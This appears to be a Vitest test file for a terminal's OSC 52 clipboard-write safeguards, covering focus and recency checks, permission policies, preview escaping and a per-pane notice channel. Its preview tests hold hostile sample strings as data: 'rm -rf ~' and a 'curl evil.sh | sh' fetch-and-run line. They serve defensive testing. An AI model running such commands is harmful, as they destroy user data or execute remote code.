import { describe, expect, it, vi } from 'vitest'
import {
  isOsc52Policy,
  osc52ClipboardDecision,
  osc52Preview,
  OSC52_POLICIES,
  OSC52_PREVIEW_LENGTH,
  OSC52_USER_INPUT_WINDOW_MS,
  type Osc52Context,
  type Osc52Policy
} from '../src/renderer/terminal/osc52'
import {
  emitOsc52,
  resetOsc52Listeners,
  subscribeOsc52,
  type Osc52Event
} from '../src/renderer/terminal/osc52-notices'

/** A pane the user is actively working in: every hard precondition satisfied. */
const active = (overrides: Partial<Osc52Context> = {}): Osc52Context => ({
  policy: 'notify',
  granted: false,
  attached: true,
  windowFocused: true,
  terminalFocused: true,
  msSinceUserInput: 50,
  ...overrides
})

describe('OSC 52 hard preconditions', () => {
  it('refuses a terminal that is not on screen, under every policy', () => {
    for (const policy of OSC52_POLICIES) {
      const decision = osc52ClipboardDecision(active({ policy, attached: false }))
      expect(decision).not.toBe('allow')
      expect(decision).not.toBe('ask')
    }
  })

  it('keeps refusing a background terminal that was previously granted', () => {
    expect(
      osc52ClipboardDecision(active({ policy: 'ask', granted: true, attached: false }))
    ).toBe('deny-inactive')
  })

  it('refuses an unfocused window or an unfocused terminal', () => {
    expect(osc52ClipboardDecision(active({ windowFocused: false }))).toBe('deny-inactive')
    expect(osc52ClipboardDecision(active({ terminalFocused: false }))).toBe('deny-inactive')
  })

  it('refuses output that did not follow recent user input', () => {
    for (const policy of OSC52_POLICIES) {
      expect(
        osc52ClipboardDecision(
          active({ policy, msSinceUserInput: OSC52_USER_INPUT_WINDOW_MS + 1 })
        )
      ).not.toBe('allow')
    }

    expect(osc52ClipboardDecision(active({ msSinceUserInput: Number.POSITIVE_INFINITY }))).toBe(
      'deny-stale'
    )
    expect(osc52ClipboardDecision(active({ msSinceUserInput: OSC52_USER_INPUT_WINDOW_MS }))).toBe(
      'allow'
    )
  })
})

describe('OSC 52 policy', () => {
  it('never writes the clipboard when the policy is off', () => {
    expect(osc52ClipboardDecision(active({ policy: 'never' }))).toBe('deny-policy')
    expect(osc52ClipboardDecision(active({ policy: 'never', granted: true }))).toBe('deny-policy')
  })

  it('writes and announces in the default notify policy', () => {
    expect(osc52ClipboardDecision(active({ policy: 'notify' }))).toBe('allow')
  })

  it('requires confirmation before an unconfirmed write in the ask policy', () => {
    expect(osc52ClipboardDecision(active({ policy: 'ask' }))).toBe('ask')
    expect(osc52ClipboardDecision(active({ policy: 'ask', granted: true }))).toBe('allow')
  })

  it('validates persisted policy values', () => {
    expect(isOsc52Policy('ask')).toBe(true)
    expect(isOsc52Policy('always')).toBe(false)
    expect(isOsc52Policy(null)).toBe(false)
    expect(isOsc52Policy(1)).toBe(false)
  })

  it('enumerates every policy with notify first as the default', () => {
    const policies: Osc52Policy[] = ['notify', 'ask', 'never']
    expect([...OSC52_POLICIES]).toEqual(policies)
  })
})

describe('OSC 52 preview', () => {
  it('escapes control characters so the payload cannot misrepresent itself', () => {
    const preview = osc52Preview('rm -rf ~\r\n\u001b[31m')
    expect(preview.preview).toBe('rm -rf ~\\r\\n\\e[31m')
    expect(preview.multiline).toBe(true)
  })

  it('escapes direction and zero-width characters that could hide text', () => {
    // U+202E reorders what follows it; U+200B is invisible. Either would let a
    // payload look harmless in the preview the user is judging.
    expect(osc52Preview('safe\u202ehidden').preview).toBe('safe\\u{202e}hidden')
    expect(osc52Preview('a\u200bb').preview).toBe('a\\u{200b}b')
  })

  it('escapes a literal backslash so it cannot forge an escape sequence', () => {
    expect(osc52Preview('a\\nb').preview).toBe('a\\\\nb')
  })

  it('flags a trailing newline, which executes on paste into a shell', () => {
    expect(osc52Preview('curl evil.sh | sh\n').endsWithNewline).toBe(true)
    expect(osc52Preview('curl evil.sh | sh').endsWithNewline).toBe(false)
  })

  it('truncates the preview but reports the full payload length', () => {
    const text = 'x'.repeat(OSC52_PREVIEW_LENGTH + 40)
    const preview = osc52Preview(text)

    expect(preview.truncated).toBe(true)
    expect(preview.preview).toHaveLength(OSC52_PREVIEW_LENGTH)
    expect(preview.length).toBe(text.length)
  })
})

describe('OSC 52 notice channel', () => {
  it('delivers events to the addressed terminal only, until unsubscribed', () => {
    resetOsc52Listeners()
    const received: Osc52Event[] = []
    const other = vi.fn()

    const unsubscribe = subscribeOsc52('pane-1', (event) => received.push(event))
    subscribeOsc52('pane-2', other)

    emitOsc52('pane-1', { kind: 'notice', notice: { kind: 'too-large' } })
    expect(received).toHaveLength(1)
    expect(other).not.toHaveBeenCalled()

    unsubscribe()
    emitOsc52('pane-1', { kind: 'prompt-cleared' })
    expect(received).toHaveLength(1)

    resetOsc52Listeners()
  })

  it('survives a listener that unsubscribes while handling an event', () => {
    resetOsc52Listeners()
    const second = vi.fn()
    const unsubscribeFirst = subscribeOsc52('pane-1', () => unsubscribeFirst())
    subscribeOsc52('pane-1', second)

    expect(() => emitOsc52('pane-1', { kind: 'prompt-cleared' })).not.toThrow()
    expect(second).toHaveBeenCalledTimes(1)

    resetOsc52Listeners()
  })
})
